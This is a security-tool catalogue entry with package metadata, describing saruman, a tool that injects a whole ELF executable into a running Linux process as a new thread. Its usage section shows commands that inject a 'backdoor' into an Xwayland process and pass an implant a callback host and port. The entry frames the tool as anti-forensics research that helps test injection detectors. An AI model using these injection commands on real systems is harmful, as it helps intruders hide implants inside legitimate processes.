---
name: "saruman"
categories:
  - blackarch-binary
version: "2.4be8db5"
homepage: "https://github.com/elfmaster/saruman"
packaged-by: [blackarch]
blackarch-builddate: "2018-03-15"
build-system: make
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "elfmaster/saruman"
github-stars: 155
github-pushed: "2026-09-30"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.8
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 30
gh-activity-checked: "2026-11-09"
---

# saruman

> Inject a full dynamically linked ELF executable into a live process, with thread injection.

## What it's for

saruman (by elfmaster) is an anti-forensics research tool that injects a
complete dynamically linked PIE executable into the address space of a running
process and creates a thread of execution for it — so an implant runs inside a
legitimate host process with that process's privileges, rather than as a new
binary on disk. It works by loading the injected ELF via the dynamic loader
machinery and applies a set of documented constraints: the injected executable
is modified on disk (its PIE flag in `DT_FLAGS_1` is cleared so glibc's
dlopen will accept it), ptrace scope must be disabled or the tool run as root,
and injected programs using libc `fork()` need to use `SYS_clone` instead
because the hand-rolled thread lacks its own TCB/TLS. Intended for lab study
of process-injection detection and defense.

## Typical use cases

### Run an implant inside an existing process

```
ps auxw | grep Xwayland
sudo ./saruman 4925 ./backdoor
```

Outcome: saruman maps the injected executable into PID 4925, resolves its
dynamic dependencies, and starts it on a new thread inside the host process —
success prints `Successfully injected executable ... into target process`. The
implant now behaves as if the legitimate process itself opened its listener
(upstream's example backdoor answers on a local port with the host's
privileges).

### Pass arguments to the injected program

```
sudo ./saruman 4925 ./agent corp.example.com 4444
```

Outcome: the arguments after the executable path become the injected
program's `argv`, so the implant's configuration (callback host, port) can be
supplied at injection time without rebuilding it.

### Verify injection from the outside

```
sudo ./saruman 4925 ./probe && cat /proc/4925/maps
```

Outcome: after injection, the process's memory map shows the implanted code
residing in the target's mappings rather than a separate executable — the
same observable that host-based injection detectors (such as the upstream
author's Shiva `detect_saruman` module) key on, useful for testing detection
coverage.

*No corpus evidence — derived from upstream documentation.*
